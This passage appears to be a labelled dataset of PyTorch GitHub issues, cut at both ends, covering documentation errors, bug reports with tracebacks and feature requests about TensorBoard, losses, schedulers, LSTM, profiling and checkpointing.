SummaryWriter()\r\n\r\ntransform = transforms.Compose([transforms.ToTensor(), transforms.Normalize((0.5,), (0.5,))])\r\ntrainset = datasets.MNIST('mnist', train=True, download=True, transform=transform)\r\ntrainloader = torch.utils.data.DataLoader(trainset, batch_size=64, shuffle=True)\r\nmodel = torchvision.models.resnet50(False)\r\n  # Have ResNet model take in grayscale rather than RGB\r\nmodel.conv1 = torch.nn.Conv2d(1, 64, kernel_size=7, stride=2, padding=3, bias=False)\r\nimages, labels = next(iter(trainloader))\r\ngrid = torchvision.utils.make_grid(images)\r\nwriter.add_image('images', grid, 0)\r\nwriter.add_graph(model, images)\r\nwriter.close()\r\n\r\n```\r\n\r\n> Downloading http://yann.lecun.com/exdb/mnist/train-images-idx3-ubyte.gz\r\n> Downloading http://yann.lecun.com/exdb/mnist/train-labels-idx1-ubyte.gz\r\n> Downloading http://yann.lecun.com/exdb/mnist/t10k-images-idx3-ubyte.gz\r\n> Downloading http://yann.lecun.com/exdb/mnist/t10k-labels-idx1-ubyte.gz\r\n> Processing...\r\n> Done!\r\n> Error occurs, No graph saved\r\n> Traceback (most recent call last):\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/utils/tensorboard/_pytorch_graph.py\", line 276, in graph\r\n>     trace, _ = torch.jit.get_trace_graph(model, args)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/jit/__init__.py\", line 231, in get_trace_graph\r\n>     return LegacyTracedModule(f, _force_outplace, return_inputs)(*args, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 493, in __call__\r\n>     result = self.forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/jit/__init__.py\", line 294, in forward\r\n>     out = self.inner(*trace_inputs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 491, in __call__\r\n>     result = self._slow_forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 481, in _slow_forward\r\n>     result = self.forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torchvision/models/resnet.py\", line 149, in forward\r\n>     x = self.avgpool(x)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 491, in __call__\r\n>     result = self._slow_forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 481, in _slow_forward\r\n>     result = self.forward(*input, **kwargs)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/pooling.py\", line 563, in forward\r\n>     self.padding, self.ceil_mode, self.count_include_pad)\r\n> RuntimeError: Given input size: (2048x1x1). Calculated output size: (2048x-5x-5). Output size is too small at /pytorch/aten/src/THNN/generic/SpatialAveragePooling.c:48\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\n> Traceback (most recent call last):\r\n>   File \"/home/tian/pycharm-2018.3.3/helpers/pydev/pydevd.py\", line 1741, in <module>\r\n>     main()\r\n>   File \"/home/tian/pycharm-2018.3.3/helpers/pydev/pydevd.py\", line 1735, in main\r\n>     globals = debugger.run(setup['file'], None, None, is_module)\r\n>   File \"/home/tian/pycharm-2018.3.3/helpers/pydev/pydevd.py\", line 1135, in run\r\n>     pydev_imports.execfile(file, globals, locals)  # execute the script\r\n>   File \"/home/tian/pycharm-2018.3.3/helpers/pydev/_pydev_imps/_pydev_execfile.py\", line 18, in execfile\r\n>     exec(compile(contents+\"\\n\", file, 'exec'), glob, loc)\r\n>   File \"/home/tian/Desktop/ai/machine-learn/Image_recognition/tensorboard_test.py\", line 18, in <module>\r\n>     writer.add_graph(model, images)\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/utils/tensorboard/writer.py\", line 534, in add_graph\r\n>     self._get_file_writer().add_graph(graph(model, input_to_model, verbose, **kwargs))\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/utils/tensorboard/_pytorch_graph.py\", line 279, in graph\r\n>     _ = model(*args)  # don't catch, just print the error message\r\n>   File \"/home/tian/.conda/envs/jiqi/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 493, in __call__\r\n>     result = self.forward(*input, **kwargs)\r\n> TypeError: forward() takes 2 positional arguments but 65 were given\r\n\r\n- \r\n![2019-05-06 14-14-41 的屏幕截图](https://user-images.githubusercontent.com/37957822/57209028-52579980-7009-11e9-9e16-4c694ae08c33.png)\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe example in https://pytorch.org/docs/stable/nn.html#tripletmarginloss isn't very clear. It doesn't specify which input is the anchor, positive, and negative. \r\nCurrent:\r\n>>> triplet_loss = nn.TripletMarginLoss(margin=1.0, p=2)\r\n>>> input1 = torch.randn(100, 128, requires_grad=True)\r\n>>> input2 = torch.randn(100, 128, requires_grad=True)\r\n>>> input3 = torch.randn(100, 128, requires_grad=True)\r\n>>> output = triplet_loss(input1, input2, input3)\r\n>>> output.backward()\r\n\r\nProposed:\r\n>>> triplet_loss = nn.TripletMarginLoss(margin=1.0, p=2)\r\n>>> anchor = torch.randn(100, 128, requires_grad=True)\r\n>>> positive = torch.randn(100, 128, requires_grad=True)\r\n>>> negative = torch.randn(100, 128, requires_grad=True)\r\n>>> output = triplet_loss(anchor, positive, negative)\r\n>>> output.backward()\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nhttps://pytorch.org/docs/stable/nn.html?highlight=grucell#torch.nn.GRUCell\r\n$$\r\n\\begin{aligned} r &=\\sigma\\left(W_{i r} x+b_{i r}+W_{h r} h+b_{h r}\\right) \\\\ z &=\\sigma\\left(W_{i z} x+b_{i z}+W_{h z} h+b_{h z}\\right) \\\\ n &=\\tanh \\left(W_{i n} x+b_{i n}+r *\\left(W_{h n} h+b_{h n}\\right)\\right) \\\\ h^{\\prime} &=(1-z) * n+z * h \\end{aligned}\r\n$$\r\n\r\nFor the last one , It should be (1-z) * h+z * n. \r\n$$\r\nh^{\\prime}=(1-z) * h+z * n\r\n$$\r\n"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe documentation for the newly introduced `CosineAnnealingWarmRestarts` learning rate scheduler (#17226) does not appear on the website (see [here](https://pytorch.org/docs/stable/optim.html); the location where it should be).\r\n\r\nFurthermore, looking at the [source code of the function](https://github.com/pytorch/pytorch/blob/master/torch/optim/lr_scheduler.py#L699), I am very confused about how to use the scheduler.\r\n\r\nSpecifically, if we look at the documentation of `.step()`, we first see a clear typo, where `CosineAnnealingWarmRestarts` is called `SGDR`. But the provided example is not sufficient to use as a reference. Where did the value 26 come from and why, and what does it have to do with 10 iterations? Also, [the paper](https://arxiv.org/abs/1608.03983) on which this scheduler is based states that the LR should be updated every _batch_, not epoch. I believe the statement in the documentation `SGDR.step(0.1), SGDR.step(0.2)` is referring to this, but I am lost in the example.\r\n\r\nIf I try to ignore the docstring and look at the source code, my best guess is that the correct message for the docstring in `.step` should be something like:\r\n\r\n```python\r\n\"\"\"Step should be called after every time a batch is processed in addition to after each epoch,\r\n   like in the following example:\r\n\r\n         >>> scheduler = CosineAnnealingWarmRestarts(optimizer, T_0, T_mult)\r\n         >>> for epoch in range(N):\r\n         >>>     scheduler.step(epoch)\r\n         >>>     for inputs, labels in trainloader:\r\n         >>>         optimizer.zero_grad()\r\n         >>>         outputs = net(inputs)\r\n         >>>         loss = criterion(outputs, labels)\r\n         >>>         loss.backward()\r\n         >>>         optimizer.step()\r\n         >>>         scheduler.step()\r\n\"\"\"\r\n```\r\n\r\nIs this correct? Or have I misinterpreted how to apply this function?\r\n\r\nThanks for the great work and please let me know if I can help in some way."},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/stable/nn.html?highlight=attention#torch.nn.MultiheadAttention\r\n\r\nThe docstring for the inputs and outputs of nn.MultiheadAttention are broken since they are in the wrong format. They also light on description of each input.\r\n\r\n They display for inputs as,\r\nquery: [target length, batch size, embed dim] key: [sequence length, batch size, embed dim] value: [sequence length, batch size, embed dim] key_padding_mask: if True, mask padding based on batch size incremental_state: if provided, previous time steps are cashed need_weights: output attn_output_weights static_kv: key and value are static\r\n\r\nand for outputs as.\r\nattn_output: [target length, batch size, embed dim] attn_output_weights: [batch size, target length, sequence length]\r\n"},{"labels":[null,"documentation",null,null],"text":"PyTorch 1.0.1 documentation for `geometric` defines it as [*f(X = k) = (1 - p)^(k - 1)p*](https://pytorch.org/docs/stable/tensors.html#torch.Tensor.geometric_) whereas the inline comment in the code defines it as [*p(i) = (1 - p)p^(i - 1)*](https://github.com/pytorch/pytorch/blob/83221655a8237ca80f9673dad06a98d34c43e546/aten/src/TH/THRandom.h#L74)."},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nAfter initializing a tensor with `requires_grad=True`, applying a view, summing, and calling backward, the gradient is None. This is not the case if the tensor is initialized using the dimensions specified in the view.\r\n\r\n## To Reproduce\r\n```\r\nimport torch\r\n\r\n# test without view\r\nX = torch.tensor([[[0.25]],[[ 0.75]]],requires_grad=True,)\r\nprint(f\"X.shape: {X.shape}\")\r\nX.sum().backward()\r\nprint(f\"X.grad: {X.grad}\")\r\n\r\n# test with view\r\nX_view = torch.tensor([0.25, 0.75], requires_grad=True,).view(2, 1, 1)\r\nprint(f\"X_view.shape: {X_view.shape}\")\r\nX_view.sum().backward()\r\nprint(f\"X_view.grad: {X_view.grad}\")\r\nprint(f\"X_view.grad is None: {X_view.grad is None}\")\r\n```\r\n\r\nOutput\r\n```\r\nX.shape: torch.Size([2, 1, 1])\r\nX.grad: tensor([[[1.]],\r\n\r\n        [[1.]]])\r\nX_view.shape: torch.Size([2, 1, 1])\r\nX_view.grad: None\r\nX_view.grad is None: True\r\n```\r\n\r\n\r\n## Expected behavior\r\n\r\nGrad is not None and `X.grad` is the same as `X_view.grad`\r\n## Environment\r\nCollecting environment information...\r\nPyTorch version: 1.0.0a0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.2.88\r\n\r\nOS: CentOS Linux 7 (Core)\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-28)\r\nCMake version: Could not collect\r\n\r\nPython version: 3.6\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] Could not collect\r\n[conda] Could not collect\r\n"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n`torch.nn.functional.grid_sample(input, grid, mode='bilinear', padding_mode='zeros')`,  \r\n \r\nthe bug is conerned on the **padding mode**. By default, `padding_mode='zeros'` means when values of the grid are out of [-1,1], then those values of the grid are setting to be 0. However, this default padding mode changes the values of **the input** when values of the corresponding position in the grid are out of [-1,1]. \r\n## To Reproduce \r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Prepare a sample image A(make sure its minimum value of pixels are greater than 0), generate a tensor of the grid(making some values out of [-1,1], the same size of A).\r\n1. Use `torch.nn.functional.grid_sample` to warp A by the generated grid(use `padding_mode='zeros'`) to achieve B.\r\n1. print the maximum and the minimum value of the pixels in A and B.  \r\n\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\nThen the minimum value of B is 0, which is incorrect.\r\n## Environment\r\n - PyTorch Version : 1.0\r\n - OS: linux\r\n - How you installed PyTorch (`conda`, `pip`, source): conda\r\n - Python version: 3.6.4\r\n - CUDA/cuDNN version: 10.0\r\n - GPU models and configuration: \r\n"},{"labels":["documentation",null,null],"text":"**Documentation issue**\r\n\r\nIn the [documentation](https://pytorch.org/docs/stable/nn.html#lstm) of PyTorch 1.0.1. It is mentioned that:\r\n\r\n> batch_first – If True, then the input and output tensors are provided as (batch, seq, feature). Default: False\r\n\r\nSo I would expect the ouput tensor h_n of shape: (batch, num_layers * num_directions, hidden_size). But it is not the case. The batch is the second dimension, which does not match with the above statement from the documentation.\r\n \r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n\r\n```\r\ninput = torch.rand([60, 8, 256]) #batch size is 60, sequence size is 8, features are 256\r\nlstm = torch.nn.LSTM(256, 512, batch_first=True)\r\n_, (finalHiddenState, _) = lstm(input)\r\nprint(finalHiddenState.shape)\r\nOuput: torch.Size([1, 60, 512]) \r\n```\r\nBatch (60) is now the second dimension here"},{"labels":["documentation",null],"text":"Currently the [torch.set_flush_denormal docs](https://pytorch.org/docs/stable/torch.html?highlight=set_flush_denormal#torch.set_flush_denormal) do not mention what is the default mode.\r\n\r\nIt would also be nice if they mentioned the FTZ / DAZ flags and a link to some reference page (like [intel's](https://software.intel.com/en-us/cpp-compiler-developer-guide-and-reference-setting-the-ftz-and-daz-flags)?) - like that this method would show up for google queries like `pytorch ftz`.\r\n\r\nAlso, a note on whether denormals are flushed [on GPU](https://devblogs.nvidia.com/cuda-pro-tip-flush-denormals-confidence/) would be helpful."},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nUntil very recently, I had never understood when async copying is safe. \r\n\r\nWe should document the exact behaviors about async computing, including:\r\n\r\n+ copying:\r\n  + Async device2device: the stream synchronization behavior. device2device is always async, regardless of `non_blocking` (IIUC).\r\n  + Async device2host copy: danger of accessing CPU data without synchronization when host is pinned memory.\r\n  + Async pinned host2device copy: \r\n     Always safe.\r\n  + Async pageable host2device copy:\r\n    This is also safe. See @colesbury 's reply below.\r\n\r\n+ General compute with streams\r\n  + GC behavior when computing in S1 on tensors created in S0. Document `tensor.record_stream` please!"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\nThis is a simple one:  The documentation for torch.nn.CrossEntropyLoss states that it works for K-dimensional loss where K >= 2.  Reading the documentation I was expecting K=1 to fail, however the code handles K=1 just fine.\r\n\r\nIt looks like the issue might not be isolated to CrossEntropyLoss.  I'm thinking at minimum the documentation for CrossEntropyLoss, NLLLoss, nll_loss, and cross_entropy all have the bounds wrong for the multi-dimensional case.  The functional losses (nll_loss and cross_entropy) have the bounds right for target but wrong for input.\r\n\r\nIf there's an agreement that these four cases should be updated, then I'll be happy to submit a PR.\r\n\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"In https://pytorch.org/docs/stable/torch.html#torch.potri, the provided example will not work, because [`torch.cholesky`](https://pytorch.org/docs/stable/torch.html#torch.cholesky) spits out the lower-triangular `l` by default, whereas `torch.potri` takes the upper-triangular `u` by default.\r\n\r\nThe example should be fixed to explicitly make the `upper` param the same in both the `torch.potri` and `torch.cholesky` calls.\r\n\r\nAs a further note, I believe that the default for `upper` should be the same between the two, in anycase. My recommendation is because `potri`, `potrs`, and all the other such functions default to `upper=True`, `cholesky` should bend the knee and also be `upper=True` by default to keep things standardized."},{"labels":[null,null,"documentation",null,null],"text":"## 🚀 Feature\r\n\r\n`torch.autograd.profiler.profile().export_chrome_trace` is great. Adding information to it from Python would make it even better.\r\n\r\n## Motivation\r\n\r\nIn multi-threaded PyTorch code, it can be useful to further annotate the tracing output by adding additional information to it.\r\n\r\n## Pitch\r\n\r\nOne easy / cheap way of doing this:\r\n\r\n```cc\r\nPYBIND11_MODULE(torch, m) {\r\n  py::class_<torch::autograd::profiler::RecordFunction>(m, \"Record\")\r\n      .def(py::init<std::string>(), py::arg(\"name\"));\r\n}\r\n```\r\n\r\nAnd then in Python\r\n\r\n```python\r\nrecord = torch.Record(\"model\")\r\noutputs = model(frame)\r\ndel record  # Alternatively, turn it into a context manager.\r\n```\r\n"},{"labels":[null,null,null,"documentation",null],"text":"## 🚀 Feature\r\nThe context manager `torch.autograd.profiler.profile()` enables profiling by calling `torch.autograd._enable_profiler()` and `torch.autograd._disable_profiler()`.\r\n\r\nEnabling/disabling this profiling on the fly should be fully supported. Right now exporting chrome traces as json breaks when calling _enable and _disable directly while training happens in another thread. (The `pop()` call in https://github.com/pytorch/pytorch/blob/master/torch/autograd/profiler.py#L465 can then happen on an empty list.)\r\n\r\nWhile we're at it, building the Chrome tracing json file in Python has significant overhead and it seems reasonable to move that code into C++.\r\n\r\nIt also seems reasonable to export a gzipped json file, as Chrome can deal with those directly.\r\n\r\n(It might also be worth investigating whether running an http server alongside PyTorch which displays tracing information on demand is something we could support. Other popular ML frameworks do that.)\r\n\r\n## Motivation\r\n\r\nIn situations in which (1) there's many op executions and (2) the profiled code needs a certain burn-in time, the json file resulting from calling `export_chrome_trace()` can get many GB large. Building these large json files in Python takes a long time, and Chrome runs OOM when you try to load them.\r\n\r\nManually enabling/disabling profiling while other threads run PyTorch ops also breaks building the json traces as described above.\r\n\r\n## Pitch\r\n\r\n```python\r\ntorch.autograd.profiler.enable()\r\ntime.sleep(10)\r\nprof = torch.autograd.profiler.disable()\r\nprof.export_chrome_trace(\"tracefile.json.gz\")  # Not in Python; fast.  \r\n```\r\n\r\n## Alternatives\r\n\r\nNone what. so. ever.\r\n"},{"labels":[null,null,null,"documentation",null,null,null],"text":"According to @t-vi and Clement Pinard, PackedTensorAccessor is slower than THCDeviceTensor because it does 64-bit indexing, and 32-bit indexing can be quite a bit faster on CUDA. We should support it as an option (with documentation about how to properly test if you can use 32-bit indexing or not.)\n\ncc @ezyang @gchanan"},{"labels":[null,"documentation",null,null],"text":"The `nn.SyncBatchNorm`'s example mentions `torch.nn.utils.convert_sync_batchnorm`, `torch.nn.SyncBatchNorm.convert_sync_batchnorm`'s example mentions some global `convert_sync_batchnorm`, while both should mention `torch.nn.SyncBatchNorm.convert_sync_batchnorm` if I understand it right\r\n\r\nMaybe there can be created some special markup about some specific examples (not all of them) that would enable them to be executed as tests, then simple mistakes like this wouldn't happen."},{"labels":[null,null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nhttps://pytorch.org/docs/master/torch.html#torch.cumprod doesn't show `out=` option."},{"labels":[null,"documentation",null,null,null],"text":"## 📚 Documentation\r\n\r\nThe link to the under https://pytorch.org/docs/stable/nn.html#tripletmarginloss  pointing to the paper Learning shallow convolutional feature descriptors with triplet losse is broken. Currently its pointing to http://www.iis.ee.ic.ac.uk/~vbalnt/shallow_descr/TFeat_paper.pdf , but that link is dead. Maybe use http://www.bmva.org/bmvc/2016/papers/paper119/paper119.pdf ?\r\n"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\n```python\r\nclass PairwiseDistance(Module):\r\n    r\"\"\"\r\n    Computes the batchwise pairwise distance between vectors :math:`v_1`, :math:`v_2` using the p-norm:\r\n\r\n    .. math ::\r\n        \\Vert x \\Vert _p := \\left( \\sum_{i=1}^n  \\vert x_i \\vert ^ p \\right) ^ {1/p}\r\n\r\n    Args:\r\n        p (real): the norm degree. Default: 2\r\n        eps (float, optional): Small value to avoid division by zero.\r\n            Default: 1e-6\r\n        keepdim (bool, optional): Determines whether or not to keep the batch dimension.\r\n            Default: False\r\n\r\n    Shape:\r\n        - Input1: :math:`(N, D)` where `D = vector dimension`\r\n        - Input2: :math:`(N, D)`, same shape as the Input1\r\n        - Output: :math:`(N)`. If :attr:`keepdim` is ``False``, then :math:`(N, 1)`.\r\n\r\n    Examples::\r\n\r\n        >>> pdist = nn.PairwiseDistance(p=2)\r\n        >>> input1 = torch.randn(100, 128)\r\n        >>> input2 = torch.randn(100, 128)\r\n        >>> output = pdist(input1, input2)\r\n    \"\"\"\r\n```\r\n\r\nhere I think\r\n> - Output: :math:`(N)`. If :attr:`keepdim` is ``False``, then :math:`(N, 1)`.\r\n\r\nshould be \r\n\r\n> - Output: :math:`(N)`. If :attr:`keepdim` is ``True``, then :math:`(N, 1)`.\r\n\r\nand\r\n\r\n> keepdim (bool, optional): Determines whether or not to keep the batch dimension.\r\n\r\nhere it is not about the batch dimension but the representation dimension.\r\n"},{"labels":["documentation",null],"text":"Tensorflow has Tensorflow Serving. How do people serve models trained with pytorch. \r\nI see Pytorch has `save` and `load` API. Is there any standard way to server trained model using PyTorch?  \r\n"},{"labels":[null,null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThe [`torch.autograd.enable_grad` documentation](https://pytorch.org/docs/stable/autograd.html#torch.autograd.enable_grad) says:\r\n\r\n> Enables gradient calculation inside a `no_grad` context. This has no effect outside of `no_grad`.\r\n\r\nThis implies:\r\n```\r\n    torch.set_grad_enabled(False)\r\n    with torch.enable_grad:\r\n        # Gradient tracking will NOT be enabled here.\r\n    torch.set_grad_enabled(True)\r\n\r\nvs:\r\n\r\n    with torch.no_grad():\r\n        with torch.enable_grad:\r\n            # Gradient tracking IS enabled here.\r\n```\r\n \r\nHowever the observed behaviour (`1.0.1.post2`) is:\r\n\r\n```\r\nx = torch.tensor([.1], requires_grad=True)\r\n\r\nwith torch.no_grad():\r\n    with torch.enable_grad():\r\n        y = x * 2\r\nprint(y.requires_grad) # True (as expected)\r\n\r\nwith torch.set_grad_enabled(False):\r\n    y = x * 2\r\nprint(y.requires_grad)  # False (as expected)\r\n\r\nwith torch.set_grad_enabled(False):\r\n    with torch.enable_grad():\r\n        y = x * 2\r\n        print(y.requires_grad)  # True, but False expected from doc quote\r\n```\r\n\r\nNote the last example is not \"inside a `no_grad` context\", but it still works.\r\n\r\nOther prior art: [PyTorch set_grad_enabled(False) vs with no_grad():](https://stackoverflow.com/a/53447634/5353461)\r\n\r\n-----------\r\n\r\nI'm assuming the documentation is incorrect, and it should say simply:\r\n\r\n> Enables gradient calculation.\r\n\r\nWould you accept a PR?"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n`model.eval()`  and `with torch.no_grad` are both commonly used in evaluating a model.\r\n\r\n[Confusion exists about whether setting `model.eval()` also sets `autograd.no_grad`](https://discuss.pytorch.org/t/does-model-eval-with-torch-set-grad-enabled-is-train-have-the-same-effect-for-grad-history/17183/5?u=ataraxy)\r\n\r\nWould you accept a PR which suggests usage of the other, with words like:\r\n\r\n* If evaluating a model's performance, using Module.eval() may also be useful.\r\n* If evaluating a model's performance, using autograd.no_grad may also be useful."},{"labels":["documentation",null,null],"text":"TODO after https://github.com/pytorch/pytorch/pull/18649 series merged."},{"labels":[null,"documentation",null,null,null],"text":"It's pretty ridiculous that, for a 1D input like `x = torch.rand(5)`, `torch.logsumexp` still requires you to specify you're operating over dimension 0.\r\n\r\nIn particular `torch.logsumexp(x)` will error, saying that it needs a dim argument. `torch.logsumexp(x, 0)` works.\r\n\r\nMy suggestion is that, at the very least for 1D inputs, the default dim you operate over is set to 0. This is a problem for `logsumexp` and `cumsum`, just to name two."},{"labels":[null,null,null,"documentation",null,null],"text":"## 🚀 Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\n\r\nI am building an application where there's basically a producer and a consumer of `std::tuple<torch::Tensor, torch::Tensor>`s.\r\n\r\nThe producer has to run a neural network to produce the tensors, and the consumer has to train from the output of the producer, occasionally checkpoint to file, which the producer then occasionally reads and updates its own network with the new one. (I'm implementing Alpha Zero)\r\n\r\nThe only problem is, it seems like pytorch is not thread safe in this regard. Even when I assign two separate (but identical) networks to producer and consumer, I get an error when I run the two concurrently.\r\n\r\nTherefore, I'm trying to separate the two as processes. I'm trying to use a message queue so that the producer can send its output to the consumer. However, now I don't know how to serialize `torch::Tensor`s. I think it should be doable with `torch::serialize::InputArchive` and `torch::serialize::OutputArchive`, but the C++ API reference wasn't too kind for me to understand.\r\n\r\nSince I wasn't too sure if this is doable or not, I decided to submit as a feature request.\r\n"},{"labels":[null,null,"documentation",null,null,null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation",null,null],"text":"## 🐛 Bug\r\n\r\nWhen using `.unfold` method of `torch.Tensor`, keyword argument `dim` doesn't work: only `dimension` works.\r\n\r\n## To Reproduce\r\n\r\n```\r\n>>> x = torch.randn(34)\r\n>>> y = x.unfold(dim=0, size=10, step=5)\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nTypeError: unfold() missing 3 required positional argument: \"dimension\", \"size\", \"step\"\r\n>>> y = x.unfold(dimension=0, size=10, step=5)\r\n>>> y.shape\r\ntorch.Size([5, 10])\r\n```\r\n\r\n## Environment\r\n\r\n```\r\nCollecting environment information...\r\nPyTorch version: 1.0.1\r\nIs debug build: No\r\nCUDA used to build PyTorch: 9.0.176\r\n\r\nOS: CentOS Linux 7 (Core)\r\nGCC version: (GCC) 5.3.0\r\nCMake version: version 3.13.3\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 9.0.176\r\nGPU models and configuration: \r\nGPU 0: GeForce GTX 1080\r\nGPU 1: GeForce GTX 1080\r\n\r\nNvidia driver version: 410.79\r\ncuDNN version: Probably one of the following:\r\n/usr/local/cuda-10.0/targets/x86_64-linux/lib/libcudnn.so.7\r\n/usr/local/cuda-9.0/targets/x86_64-linux/lib/libcudnn.so.5\r\n/usr/local/cuda-9.0/targets/x86_64-linux/lib/libcudnn.so.7\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.15.4\r\n[pip3] torch==1.0.1\r\n[pip3] torchsummary==1.5.1\r\n[pip3] torchvision==0.2.1\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.1                      144  \r\n[conda] mkl-service               1.1.2            py37he904b0f_5  \r\n[conda] mkl_fft                   1.0.6            py37hd81dba3_0  \r\n[conda] mkl_random                1.0.2            py37hd81dba3_0\r\n```"},{"labels":[null,null,"documentation",null,null],"text":"## 🐛 Bug\r\n\r\nWhen setting TORCH_CUDA_ARCH_LIST=All, I expect Torch to compile with all CUDA architectures available to my current version of CUDA. Instead, it attempted to build for cuda 2.0.\r\n\r\nSee error:\r\nnvcc fatal   : Unsupported gpu architecture 'compute_20'\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Install CUDA >= 9.0\r\n2. TORCH_CUDA_ARCH_LIST=All cmake -DUSE_CUDA=ON ..\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\nFilters out 2.x architectures if CUDA >= 9.0\r\n\r\n## Environment\r\nCUDA 10.1"},{"labels":[null,null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nOn https://pytorch.org/tutorials/advanced/cpp_frontend.html and https://pytorch.org/cppdocs/frontend.html, the code that includes the pytorch library should be `#include <torch/script.h>`, not `#include <torch/torch.h>`."},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nI have a Pytorch C++ frontend (LibTorch) based deployment codebase. I am trying to add profiling support to it. I am thinking of using autograd profiler for it, which seems to be the best option as far as getting layer-by-layer timings is concerned.\r\nI recently saw a change getting pushed in which enables access to the autograd profiler from the C++ frontend (https://github.com/pytorch/pytorch/pull/16580). Is there any documentation for its usage ? Or some sort of a primer...?"},{"labels":[null,null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nWhen the autograd graph has parallel lanes, and a checkpointing is on one of the lanes, the checkpointing evaluates irrelevant backwards on another lane.\r\n\r\nFor example, if our autograd graph looks like:\r\n```\r\n          +--> Eval1\r\nSum --> Cat\r\n          +--> Checkpoint(Eval2)\r\n```\r\n\r\nThe backward of `Checkpoint(Eval2)` evaluates the backward of `Eval1` recursively.\r\n\r\nIt's not an expected behavior because there's no any dependency between them. `Eval1` should be evaluated AFTER `Checkpoint(Eval2)`.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Make parallel lanes in an autograd graph.\r\n1. Use `torch.utils.checkpoint.checkpoint` on the one of the lanes.\r\n1. Insert logs or a race condition to detect the recursion.\r\n\r\nLet me show you. Following `Log` function will record the forward and backward event into `timeline`:\r\n```python\r\ntimeline = []\r\nclass Log(torch.autograd.Function):\r\n    @staticmethod\r\n    def forward(ctx, x, name):\r\n        ctx.name = name\r\n        timeline.append('%s:forward' % name)\r\n        return x\r\n    @staticmethod\r\n    def backward(ctx, grad_output):\r\n        name = ctx.name\r\n        timeline.append('%s:backward' % name)\r\n        return grad_output, None\r\n```\r\n\r\nNow make an autograd graph like what I attached at the top:\r\n```python\r\na = torch.rand(1, requires_grad=True)\r\nb = torch.rand(1, requires_grad=True)\r\n\r\na = Log.apply(a, 'a')\r\nb = checkpoint(lambda b: Log.apply(b, 'b'), b)\r\nout = torch.cat((a, 